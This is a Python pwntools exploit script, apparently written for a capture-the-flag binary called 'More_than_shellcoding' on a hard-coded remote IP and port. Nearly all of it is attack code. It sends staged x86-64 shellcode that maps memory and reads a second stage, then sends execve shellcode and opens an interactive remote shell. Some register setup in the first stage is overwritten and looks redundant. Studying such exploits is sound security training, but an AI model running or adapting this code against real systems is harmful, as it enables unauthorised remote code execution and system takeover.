#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import monkeyhex
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./More_than_shellcoding')
host = args.HOST or '35.228.15.118'
port = int(args.PORT or 1338)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = start()

shellcode = asm("""
    push rdx
    pop rdi
    push 0x100
    pop rsi
    push 0x7
    pop rdx
    push 0x404020
    pop rbp
    mov rbx, 0x0
    mov rcx, 0x22
    mov rdx, 0x7
    mov rdi, 0x13371337
    mov rsi, 0x1000
    mov r9, 0x0
    mov r10, 0x22
    call qword ptr [rbp]
    push 0x0
    pop rdi
    push 0x13371337
    pop rsi
    push 0x1337
    pop rdx
    push 0x404030
    pop rbp
    call qword ptr [rbp]
    call rsi
""")

re()
sl(shellcode)
pause()
sl(asm(execve_x64))

io.interactive()
